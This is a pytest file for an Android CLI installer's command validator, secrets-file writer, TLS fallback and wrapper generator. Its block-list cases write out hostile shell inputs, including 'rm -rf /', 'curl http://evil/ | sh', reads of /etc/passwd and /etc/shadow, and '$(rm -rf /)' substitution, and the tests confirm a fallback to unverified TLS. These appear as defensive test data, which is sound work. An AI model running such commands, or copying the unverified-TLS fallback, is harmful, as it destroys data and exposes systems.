# -*- coding: utf-8 -*-
"""Unit tests for ancli-core.py security & wrapper-generation logic.

Runs on any host (no Android device required). Import-safe: the module only
reads config files that don't exist on a dev machine.
"""
import json
import os
import ssl
import sys
import urllib.error

import pytest

# ancli-core.py contains a hyphen, so it cannot be imported by module name;
# load it by explicit file path instead.
_core_path = os.path.join(os.path.dirname(__file__), "..", "src", "ancli-core.py")
import importlib.util  # noqa: E402
_spec = importlib.util.spec_from_file_location("ancli_core", _core_path)
core = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(core)


# ---------------------------------------------------------------------------
# validate_cmd
# ---------------------------------------------------------------------------

class TestValidateCmd:
    @pytest.mark.parametrize("cmd", [
        "pip install --break-system-packages aider-chat",
        "npm install -g something",
        "apt-get update -qy",
        "curl -sL https://example.com/x | bash -s -- --dir /usr/local/bin",
        "rm -f /usr/local/bin/mimo",
        "bash /tmp/install_agy.sh --dir /usr/local/bin",
        "sh /tmp/install_x.sh",
        "env GROK_BIN_DIR=/usr/local/bin bash /tmp/install_grok.sh",
        "curl -L https://a/b -o /tmp/x.tar.gz && tar -xzf /tmp/x.tar.gz -C /usr/local/bin && rm /tmp/x.tar.gz",
    ])
    def test_allows_legit_registry_commands(self, cmd):
        assert core.validate_cmd(cmd) is True

    @pytest.mark.parametrize("cmd", [
        "rm -rf / ; echo pwned",
        "pip install x > /etc/passwd",
        "npm install x < /etc/shadow",
        "bash /tmp/x.sh &\ncurl evil",
        "curl http://evil/ | sh; touch /pwned",
        "bash /tmp/x.sh & disown",
        "rm -rf /$(whoami)",
        "curl -o /tmp/x `id`",
        "echo hello",
        "sudo rm -rf /",
        "cat /etc/passwd",
        "env A=1; rm -rf /",
    ])
    def test_blocks_dangerous_commands(self, cmd):
        assert core.validate_cmd(cmd) is False

    @pytest.mark.parametrize("cmd", [
        # Semicolons etc. inside quoted values are data, not shell syntax
        "env GROK_BIN_DIR='a;b' bash /tmp/install_grok.sh",
        'env FLAG="x > y" bash /tmp/install.sh',
        "bash /tmp/x.sh --dir '/a b'",
        "curl -sL 'https://x/a;b.sh' -o /tmp/x.sh && bash /tmp/x.sh",
        # $() inside single quotes is literal -> allowed
        "curl -sL 'https://x/$(id)' -o /tmp/x.sh",
        # & inside double quotes is literal -> allowed
        'env FLAG="a & b" bash /tmp/install.sh',
    ])
    def test_allows_quoted_special_chars(self, cmd):
        assert core.validate_cmd(cmd) is True

    @pytest.mark.parametrize("cmd", [
        # $() / backticks execute even inside double quotes -> must be blocked
        'env FLAG="$(rm -rf /)" bash /tmp/install.sh',
        'env FLAG="`id`" bash /tmp/install.sh',
        # ANSI-C $'...' quoting expands escapes at runtime -> not stripped
        "curl $';rm -rf /' -o /tmp/x.sh",
    ])
    def test_blocks_command_substitution_inside_double_quotes(self, cmd):
        assert core.validate_cmd(cmd) is False

    def test_whitelist_prefix_requires_trailing_space(self):
        # "curl" alone (no space) must not match the "curl " prefix
        assert core.validate_cmd("curl") is False


# ---------------------------------------------------------------------------
# _write_secrets_file
# ---------------------------------------------------------------------------

class TestWriteSecretsFile:
    def test_writes_quoted_exports_and_permissions(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path))
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path.parent))
        chowns = []
        chmods = []
        monkeypatch.setattr(core.os, "system",
                            lambda c: chowns.append(c) or 0)
        monkeypatch.setattr(core.os, "chmod",
                            lambda p, m: chmods.append((os.path.normpath(str(p)), m)))

        core._write_secrets_file("my-tool", {"API_KEY": "sk-a b'c", "BASE_URL": "https://x"})

        secrets = tmp_path / "my-tool.env"
        assert secrets.exists()
        content = secrets.read_text()
        assert "export API_KEY='sk-a b'\"'\"'c'\n" in content  # shlex.quote escaping
        assert "export BASE_URL=https://x\n" in content  # plain value stays unquoted
        # Directory 0700, secrets file 0600 (POSIX modes; asserted via chmod calls
        # since Windows filesystems do not honor mode bits)
        assert (os.path.normpath(str(tmp_path)), 0o700) in chmods
        assert (os.path.normpath(str(secrets)), 0o600) in chmods
        # shell user (UID 2000) must be able to traverse dir and read the file
        assert any("chown 2000:2000" in c and str(tmp_path) in c for c in chowns)
        assert any("chown 2000:2000" in c and "my-tool.env" in c for c in chowns)

    def test_replaces_existing_file(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path))
        (tmp_path / "tool.env").write_text("export OLD=1\n")
        core._write_secrets_file("tool", {"NEW": "2"})
        content = (tmp_path / "tool.env").read_text()
        assert "OLD" not in content
        assert "NEW" in content


# ---------------------------------------------------------------------------
# TLS verification fallback
# ---------------------------------------------------------------------------

class TestRegistryTLS:
    def test_falls_back_to_unverified_only_on_cert_error(self, monkeypatch):
        calls = []
        class FakeResp:
            def read(self):
                return b'{"apps": {}}'
            def __enter__(self):
                return self
            def __exit__(self, *a):
                return False

        class FakeURLOpen:
            def __init__(self, fail_first):
                self._fail_first = fail_first
            def __call__(self, req, timeout=15, context=None):
                calls.append((timeout, context))
                if self._fail_first and context is None:
                    raise urllib.error.URLError(ssl.SSLCertVerificationError(1, "cert"))
                return FakeResp()

        monkeypatch.setattr(core.urllib.request, "urlopen", FakeURLOpen(True))
        data = core._fetch_registry_once(object())
        assert data == {"apps": {}}
        # First call verified (context None), second unverified
        assert calls[0][1] is None
        assert calls[1][1] is not None

    def test_network_error_propagates(self, monkeypatch):
        def boom(req, timeout=15, context=None):
            raise urllib.error.URLError("connection refused")

        monkeypatch.setattr(core.urllib.request, "urlopen", boom)
        with pytest.raises(urllib.error.URLError):
            core._fetch_registry_once(object())

    def test_protocol_error_does_not_trigger_unverified_fallback(self, monkeypatch):
        """Handshake/protocol SSL errors must NOT downgrade to unverified TLS."""
        calls = []

        def boom(req, timeout=15, context=None):
            calls.append(context)
            raise ssl.SSLError("WRONG_VERSION_NUMBER")

        monkeypatch.setattr(core.urllib.request, "urlopen", boom)
        with pytest.raises(ssl.SSLError):
            core._fetch_registry_once(object())
        assert calls == [None]  # only one attempt, always verified


# ---------------------------------------------------------------------------
# pipe-script install command construction
# ---------------------------------------------------------------------------

class TestPipeScriptCommand:
    def test_env_prefix_uses_env_not_nested_bash_c(self):
        import shlex
        # Simulate the exact construction used in _install_pipe_script
        installer_env = {"GROK_BIN_DIR": "/usr/local/bin", "FLAG": "a b"}
        script_path = "/tmp/install_grok.sh"
        installer_args = '--dir "/a b"'

        cmd = f"bash {shlex_quote(script_path)}"
        if installer_env:
            env_prefix = " ".join(
                f"{shlex_quote(k)}={shlex_quote(v)}" for k, v in installer_env.items()
            )
            cmd = f"env {env_prefix} {cmd}"
        if installer_args:
            # shlex.split honors quoting inside installer_args
            cmd += " " + " ".join(shlex_quote(a) for a in shlex.split(installer_args))

        # No nested single quotes; every value individually quoted
        assert cmd.startswith("env ")
        assert "bash -c '" not in cmd
        assert core.validate_cmd(cmd) is True
        # Round-trip through shlex must reproduce the intended argv
        argv = shlex_split(cmd)
        assert argv[0] == "env"
        assert "GROK_BIN_DIR=/usr/local/bin" in argv
        assert "FLAG=a b" in argv
        assert argv[argv.index("bash") + 1] == script_path
        # Quoted installer arg survives as a single token
        assert "--dir" in argv and "/a b" in argv


# ---------------------------------------------------------------------------
# wrapper generation
# ---------------------------------------------------------------------------

class TestWrapperGeneration:
    def test_wrapper_template_has_cwd_fallback_and_binds(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)

        core.generate_proot_wrapper("mimo", {"OPENAI_API_KEY": "sk-x"}, ["HOME=/root"])

        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text()
        # cwd fallback for unbound host paths
        assert "PROOT_CWD=\"$PWD\"" in wrapper
        assert "case \"$PROOT_CWD\"" in wrapper
        assert '-w "$PROOT_CWD"' in wrapper
        # root-dir hint for TUI tools
        assert 'if [ "$PWD" = "/" ]; then' in wrapper
        # full unconditional binds (AGENTS.md requirement)
        assert "-b /sdcard -b /storage -b /mnt -b /data -b /apex -b /linkerconfig -b /system" in wrapper
        # env bootstrap + per-tool secrets sourcing
        assert "ancli_env.sh" in wrapper
        assert "secrets/mimo.env" in wrapper
        # systemless + KSU/AP dual injection paths were attempted
        assert (tmp_path / "mod" / "system" / "bin" / "mimo").exists()

    def test_wrapper_rejects_path_traversal_executable(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        core.generate_proot_wrapper("../evil", {})
        assert not (tmp_path / "ancli" / "bin").exists()


def shlex_quote(s):
    import shlex
    return shlex.quote(s)


def shlex_split(s):
    import shlex
    return shlex.split(s)
